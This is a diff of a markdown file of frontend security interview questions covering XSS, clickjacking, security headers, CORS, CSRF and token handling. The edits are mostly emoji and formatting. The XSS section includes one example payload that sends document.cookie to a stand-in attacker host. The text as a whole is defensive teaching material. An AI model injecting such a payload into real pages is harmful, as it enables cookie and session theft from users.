@@ -16,13 +16,13 @@
 
 ---
 
-## Q55. Cross-Site Scripting (XSS)
+## Q55. 💡 Cross-Site Scripting (XSS)
 
 Cross-Site Scripting (XSS) is an attack where an attacker injects malicious JavaScript into a web page so that it runs in other users' browsers. It abuses the trust a user has in a website to steal data, hijack sessions, or take actions on the user's behalf. XSS is one of the most common web vulnerabilities, and understanding how to prevent it is crucial for frontend security. For security testing strategies, see [Q74. Security Testing](11%29%20Testing.md#q74-security-testing).
 
 ---
 
-## 1. What is XSS and how it works
+## 1. 💡 What is XSS and how it works
 
 ### 🔹 Core idea
 
@@ -37,8 +37,10 @@ Cross-Site Scripting (XSS) is an attack where an attacker injects malicious Java
 1. Attacker finds an input field or URL parameter that is reflected into HTML - finds where user input shows up on the page
 
 2. Injects payload like:
+
    ```html
    <script>fetch('https://attacker.com/steal?c=' + document.cookie)</script>
+
    ```
 
    - This script steals cookies and sends them to the attacker
@@ -51,7 +53,7 @@ Cross-Site Scripting (XSS) is an attack where an attacker injects malicious Java
 
 ---
 
-## 2. Types of XSS
+## 2. 🏷️ Types of XSS
 
 ### 🔹 Reflected XSS
 
@@ -77,7 +79,7 @@ Cross-Site Scripting (XSS) is an attack where an attacker injects malicious Java
 
 ---
 
-## 3. How to prevent XSS (frontend focus)
+## 3. 🎯 How to prevent XSS (frontend focus)
 
 ### 🔹 Escape and sanitize output
 
@@ -126,13 +128,13 @@ React escapes values by default when rendering, so regular JSX is safe; XSS usua
 
 ---
 
-## Q56. iframe Protection (Clickjacking)
+## Q56. 💡 iframe Protection (Clickjacking)
 
 Clickjacking is a security attack where an attacker embeds your website inside a hidden or disguised `iframe` on their malicious page. When users click on what appears to be a harmless button or element, users are actually clicking on your site's interface without realizing it. This can lead to unauthorized actions like making purchases, changing account settings, or doing social media interactions (likes, shares) on behalf of the user.
 
 ---
 
-## 1. How clickjacking works
+## 1. 💡 How clickjacking works
 
 1. Attacker creates a page that embeds your site in an `iframe` - puts your site inside their page
 
@@ -146,7 +148,7 @@ Clickjacking is a security attack where an attacker embeds your website inside a
 
 ---
 
-## 2. Defenses with headers
+## 2. 💡 Defenses with headers
 
 ### 🔹 X-Frame-Options
 
@@ -164,7 +166,7 @@ Clickjacking is a security attack where an attacker embeds your website inside a
 
 ---
 
-## 3. In-app protections
+## 3. 💡 In-app protections
 
 ### 🔹 Frame-busting scripts (fallback)
 
@@ -201,21 +203,23 @@ When your app is intentionally embedded (widgets, dashboards, payments) — then
 
 ---
 
-## Q57. Security Headers
+## Q57. 🛡️ Security Headers
 
 Security headers are HTTP response headers that tell the browser to enforce additional security rules. These headers are a low-effort, high-impact way to harden frontend behavior without changing much code - you just configure them once and the browser does the work.
 
 ---
 
-## 1. Important security headers
+## 1. 🛡️ Important security headers
 
 ### 🔹 Content-Security-Policy (CSP)
 
 * Controls where scripts, styles, images, etc. can load from - restricts what resources can be loaded
 
 * Example:
+
   ```http
   Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com
+
   ```
 
   - This says: by default only load from your own domain, but scripts can also come from cdn.example.com
@@ -227,8 +231,10 @@ Security headers are HTTP response headers that tell the browser to enforce addi
 ### 🔹 Strict-Transport-Security (HSTS)
 
 * Forces browser to use HTTPS only:
+
   ```http
   Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+
   ```
 
   - Tells browser to always use HTTPS for this site, even if user types HTTP
@@ -249,7 +255,7 @@ Security headers are HTTP response headers that tell the browser to enforce addi
 
 ---
 
-## 2. Frontend engineer responsibilities
+## 2. 💡 Frontend engineer responsibilities
 
 * Know which headers should be enabled for your app
 
@@ -275,13 +281,13 @@ Start with `Content-Security-Policy-Report-Only`, collect violation reports, fix
 
 ---
 
-## Q58. Client-Side Security
+## Q58. 🛡️ Client-Side Security
 
 Client-side security is about protecting logic and data that run in the browser. You cannot fully trust the client, but you can make attacks harder and protect users from obvious risks - think of it as defense in depth.
 
 ---
 
-## 1. Key principles
+## 1. 💡 Key principles
 
 ### 🔹 Never trust the client
 
@@ -303,7 +309,7 @@ Client-side security is about protecting logic and data that run in the browser.
 
 ---
 
-## 2. Practical frontend practices
+## 2. 💡 Practical frontend practices
 
 * Use **HTTPS everywhere** to avoid man-in-the-middle - encrypt all traffic
 
@@ -331,17 +337,17 @@ No. Anything shipped to the browser can be viewed; treat all frontend code as pu
 
 ---
 
-## Q59. Secure Communication (HTTPS)
+## Q59. 🌐 Secure Communication (HTTPS)
 
 Secure communication ensures data between browser and server is protected from eavesdropping and tampering. On the web, this mainly means using HTTPS (HTTP over TLS) - it's like wrapping your data in an encrypted tunnel.
 
 ---
 
-## 1. What HTTPS provides
+## 1. 🌐 What HTTPS provides
 
 ### 🔹 Confidentiality
 
-* Data is **encrypted** so attackers on the network cannot read it - even if attackers intercept traffic, they can't understand it
+* Data is **encrypted** so attackers on the network cannot read it - even if attackers intercept traffic, these attackers can't understand it
 
 ### 🔹 Integrity
 
@@ -355,7 +361,7 @@ Secure communication ensures data between browser and server is protected from e
 
 ---
 
-## 2. Frontend responsibilities for HTTPS
+## 2. 🌐 Frontend responsibilities for HTTPS
 
 * Always use `https://` URLs for APIs, assets, and links - encrypt everything
 
@@ -383,13 +389,13 @@ No. HTTPS protects data in transit, not what runs in the browser. You still need
 
 ---
 
-## Q60. Dependency Security
+## Q60. 🛡️ Dependency Security
 
 Dependency security is about ensuring the libraries and packages you use don't introduce vulnerabilities into your application. In modern frontend stacks, most of your code is actually dependencies. For dependency scanning and testing strategies, see [Q74. Security Testing](11%29%20Testing.md#q74-security-testing).
 
 ---
 
-## 1. Risks from dependencies
+## 1. 💡 Risks from dependencies
 
 * Known vulnerabilities (XSS, prototype pollution, RCE) - packages with security bugs
 
@@ -401,7 +407,7 @@ Dependency security is about ensuring the libraries and packages you use don't i
 
 ---
 
-## 2. How to manage dependency security
+## 2. 🛡️ How to manage dependency security
 
 * Use **npm audit**, GitHub Dependabot, or similar tools - automatically check for vulnerabilities
 
@@ -429,13 +435,13 @@ Identify impact, update or patch the package, test regressions, and if needed ad
 
 ---
 
-## Q61. Compliance and Regulations
+## Q61. 💡 Compliance and Regulations
 
 Compliance ensures your frontend respects legal and industry rules like GDPR, CCPA, PCI-DSS, or HIPAA. While legal teams own requirements, frontend engineers must implement them correctly in UI and data flows.
 
 ---
 
-## 1. Common compliance themes
+## 1. 💡 Common compliance themes
 
 * **User consent** (cookies, tracking, marketing) - get permission before collecting data
 
@@ -449,7 +455,7 @@ Compliance ensures your frontend respects legal and industry rules like GDPR, CC
 
 ---
 
-## 2. Frontend responsibilities
+## 2. 💡 Frontend responsibilities
 
 * Implement clear **consent banners** and preference centers - make it easy for users to understand and control their data
 
@@ -475,13 +481,13 @@ Only set non-essential cookies after explicit consent and give users a way to ch
 
 ---
 
-## Q62. Input Validation and Sanitization
+## Q62. ✅ Input Validation and Sanitization
 
 Input validation and sanitization ensure that user-provided data is safe and in the format your system expects. It is one of the first lines of defense against many attacks.
 
 ---
 
-## 1. Validation vs sanitization
+## 1. ✅ Validation vs sanitization
 
 * **Validation**: Check if data is acceptable (type, length, pattern) - is this input in the right format?
 
@@ -491,7 +497,7 @@ Input validation and sanitization ensure that user-provided data is safe and in 
 
 ---
 
-## 2. Frontend and backend roles
+## 2. 💡 Frontend and backend roles
 
 * Frontend:
   * Validate for **UX** (instant feedback, better forms) - give users immediate feedback
@@ -516,13 +522,13 @@ Because attackers can bypass the UI and send raw HTTP requests; only server-side
 
 ---
 
-## Q63. Server-Side Request Forgery (SSRF)
+## Q63. 🖥️ Server-Side Request Forgery (SSRF)
 
 SSRF is an attack where an application makes HTTP requests to arbitrary URLs controlled by an attacker, often allowing access to internal services. While it's mostly a backend issue, frontend designs can influence exposure.
 
 ---
 
-## 1. How SSRF happens
+## 1. 🔄 How SSRF happens
 
 * App allows user to specify a URL (webhook, image fetch, URL preview) - user can tell your server to fetch any URL
 
@@ -534,7 +540,7 @@ SSRF is an attack where an application makes HTTP requests to arbitrary URLs con
 
 ---
 
-## 2. Frontend Things to Keep in Mind
+## 2. ⬇️ ⬇️ Frontend Things to Keep in Mind
 
 * Avoid exposing **raw URL fetch features** unless necessary - don't let users make your server fetch arbitrary URLs
 
@@ -560,13 +566,13 @@ A URL preview feature where the user pastes any link and the server fetches the 
 
 ---
 
-## Q64. Server-Side JavaScript Injection (SSJI)
+## Q64. 🖥️ Server-Side JavaScript Injection (SSJI)
 
 Server-Side JavaScript Injection (SSJI) occurs when user input is executed as JavaScript on the server (for example, in Node.js templates or eval-like APIs). It can lead to full server compromise.
 
 ---
 
-## 1. How SSJI works
+## 1. 💡 How SSJI works
 
 * Backend uses `eval`, template engines, or dynamic code generation with **user-controlled strings** - server executes user input as code
 
@@ -578,7 +584,7 @@ Server-Side JavaScript Injection (SSJI) occurs when user input is executed as Ja
 
 ---
 
-## 2. Frontend impact
+## 2. 💡 Frontend impact
 
 * Avoid designing features that require **server to execute user scripts** - don't design features that need this
 
@@ -602,19 +608,21 @@ Dynamic MongoDB queries built from user strings, or using `eval()` on server to 
 
 ---
 
-## Q65. Feature Policy / Permissions Policy
+## Q65. 💡 Feature Policy / Permissions Policy
 
 Permissions Policy (formerly Feature Policy) is a security header that controls which origins can use powerful browser features like camera, geolocation, fullscreen, and more.
 
 ---
 
-## 1. What Permissions Policy does
+## 1. 💡 What Permissions Policy does
 
 * Allows you to **enable/disable features** per origin or per iframe - control which browser APIs can be used
 
 * Example:
+
   ```http
   Permissions-Policy: geolocation=(), camera=(), microphone=()
+
   ```
 
   → disables these features everywhere - blocks access to location, camera, and microphone
@@ -623,15 +631,17 @@ Permissions Policy (formerly Feature Policy) is a security header that controls 
 
 ---
 
-## 2. Frontend usage
+## 2. 💡 Frontend usage
 
 * Decide which features your app actually needs - only enable what you use
 
 * Disable everything else via header - block everything else by default
 
 * For embedded iframes, use `allow` attribute to grant minimal rights:
+
   ```html
   <iframe src="..." allow="fullscreen; geolocation">
+
   ```
 
   - Only give iframes the permissions these actually need
@@ -652,13 +662,13 @@ CSP controls where resources come from; Permissions Policy controls which browse
 
 ---
 
-## Q66. Subresource Integrity (SRI)
+## Q66. 💡 Subresource Integrity (SRI)
 
 Subresource Integrity (SRI) ensures that external scripts or styles (usually from CDNs) haven't been tampered with. The browser verifies a hash of the resource before executing it.
 
 ---
 
-## 1. How SRI works
+## 1. 💡 How SRI works
 
 * You add an `integrity` attribute with a hash of the resource content - include a checksum in your HTML
 
@@ -677,7 +687,7 @@ Subresource Integrity (SRI) ensures that external scripts or styles (usually fro
 
 ---
 
-## 2. When to use SRI
+## 2. 💡 When to use SRI
 
 * Any time you load **3rd-party resources** from a CDN (JS, CSS) - protect against CDN compromise
 
@@ -699,13 +709,13 @@ You must update the SRI hash in your HTML; otherwise the browser will block the 
 
 ---
 
-## Q67. Cross-Origin Resource Sharing (CORS)
+## Q67. 💡 Cross-Origin Resource Sharing (CORS)
 
 CORS is a browser security mechanism that controls which origins can make cross-origin HTTP requests and read the responses. It protects users from some kinds of cross-site attacks but must be configured correctly.
 
 ---
 
-## 1. How CORS works
+## 1. 💡 How CORS works
 
 * Browser sends **Origin** header with cross-origin requests - browser tells server where the request came from
 
@@ -717,7 +727,7 @@ CORS is a browser security mechanism that controls which origins can make cross-
 
 ---
 
-## 2. Frontend Things to Keep in Mind
+## 2. ⬇️ ⬇️ Frontend Things to Keep in Mind
 
 * Prefer calling **your own backend** and allow it to talk to third parties - use your backend as a proxy
 
@@ -741,13 +751,13 @@ Because CORS is enforced by browsers; Postman is not a browser so it can call an
 
 ---
 
-## Q68. Cross-Site Request Forgery (CSRF)
+## Q68. 💡 Cross-Site Request Forgery (CSRF)
 
 CSRF is an attack where a malicious site tricks a logged-in user's browser into making unwanted requests to another site where the user is authenticated (e.g., changing password, transferring money).
 
 ---
 
-## 1. How CSRF works
+## 1. 💡 How CSRF works
 
 1. User logs into `bank.com` (session cookie stored by browser) - user is authenticated
 
@@ -761,7 +771,7 @@ CSRF is an attack where a malicious site tricks a logged-in user's browser into 
 
 ---
 
-## 2. Defenses
+## 2. 💡 Defenses
 
 ### 🔹 CSRF tokens
 
@@ -803,13 +813,13 @@ XSS runs malicious JavaScript in your site's context, while CSRF tricks the brow
 
 ---
 
-## Q69. Access Token and Refresh Token Management
+## Q69. 💡 Access Token and Refresh Token Management
 
 Access tokens and refresh tokens are used together to securely authenticate users without requiring them to log in repeatedly. Access tokens are short-lived and used for API requests, while refresh tokens are long-lived and used to get new access tokens when these expire. Understanding how to manage these tokens properly is crucial for building secure authentication systems.
 
 ---
 
-## 1. What are Access and Refresh Tokens
+## 1. 💡 What are Access and Refresh Tokens
 
 ### 🔹 Access Token
 
@@ -861,7 +871,7 @@ Access tokens and refresh tokens are used together to securely authenticate user
 
 ---
 
-## 2. Why Use Both Tokens
+## 2. 💡 Why Use Both Tokens
 
 ### 🔹 Security Benefits
 
@@ -909,7 +919,7 @@ Access tokens and refresh tokens are used together to securely authenticate user
 
 ---
 
-## 3. Token Flow
+## 3. 💡 Token Flow
 
 ### 🔹 Initial Login
 
@@ -1002,7 +1012,7 @@ Access tokens and refresh tokens are used together to securely authenticate user
 
 ---
 
-## 4. Implementation: Token Refresh Logic
+## 4. 💡 Implementation: Token Refresh Logic
 
 ### 🔹 Client-Side Implementation
 
@@ -1134,7 +1144,7 @@ app.post('/api/auth/refresh', async (req, res) => {
 
 ---
 
-## 5. Logout Implementation
+## 5. 💡 Logout Implementation
 
 ### 🔹 Client-Side Logout
 
@@ -1203,7 +1213,7 @@ app.post('/api/auth/logout', async (req, res) => {
 
 ---
 
-## 6. Security Best Practices
+## 6. 🛡️ Security Best Practices
 
 ### 🔹 Token Storage
 
@@ -1261,7 +1271,7 @@ app.post('/api/auth/logout', async (req, res) => {
 
 ---
 
-## 7. Frontend Implementation (React.js)
+## 7. ⚛️ Frontend Implementation (React.js)
 
 ### 🔹 Token Refresh with Axios Interceptor
 
@@ -1427,7 +1437,7 @@ export const clearAccessToken = () => {
 
 ---
 
-## 8. Backend Implementation (Node.js/Express.js)
+## 8. 🟢 Backend Implementation (Node.js/Express.js)
 
 ### 🔹 Token Refresh Endpoint
 
@@ -1627,9 +1637,9 @@ Token expiration is automatic (JWT has expiry). Token blacklisting is manual (re
 
 <div align="center">
 
-[11) Low Level Design.md](11%29%20Low%20Level%20Design.md) • [Questions Index](question.md) • [13) Testing.md →](13%29%20Testing.md)
+[← Previous: Low Level Design](15%29%20Low%20Level%20Design.md) • [Home: Questions Index](question.md) • [Next: Testing →](17%29%20Testing.md)
 
-[FE-System-Design Cheatsheet](FE-System-Design%20Interview%20Cheatsheet.md]
+[📋 Cheatsheet](FE-System-Design%20Interview%20Cheatsheet.md)
 
 </div>
 
